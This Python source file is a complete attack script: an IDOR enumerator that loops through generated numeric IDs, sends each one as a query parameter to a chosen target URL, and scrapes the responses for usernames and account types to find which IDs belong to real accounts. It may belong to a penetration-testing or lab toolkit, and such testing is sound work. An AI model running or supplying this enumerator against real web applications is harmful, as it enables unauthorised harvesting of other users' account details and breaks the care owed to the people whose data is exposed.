import requests
from bs4 import BeautifulSoup

from IDORResponse import IDORResponse
import payloads

def search_response(incoming_response):
    soup = BeautifulSoup(incoming_response, "html.parser")
    p_tags = soup.find_all("p")
    parsed_response = {}
    for p_tag in p_tags:
        if "Username" in p_tag.string:
            parsed_response["username"] = p_tag.string
        if "Type" in p_tag.string:
            parsed_response["type"] = p_tag.string
        if p_tag.string == "No account information found":
            parsed_response["user_not_found"] = True
        else:
            parsed_response["user_not_found"] = False
    return parsed_response

def idor_enumerator(target_url, query_parameter):
    responses = []
    numbers_dictionary = payloads.generate_numbers_dictionary()
    for i in numbers_dictionary:
        parameters = {
            query_parameter:i
        }
        response = requests.get(target_url, params=parameters)
        parsed_response = search_response(incoming_response=response.text)
        idor_response = IDORResponse()
        idor_response.url = response.url
        idor_response.username = parsed_response.get("username")
        idor_response.type = parsed_response.get("type")
        if parsed_response.get("user_not_found"):
            idor_response.is_user = False
        else:
            idor_response.is_user = True
        responses.append(idor_response)
    return responses

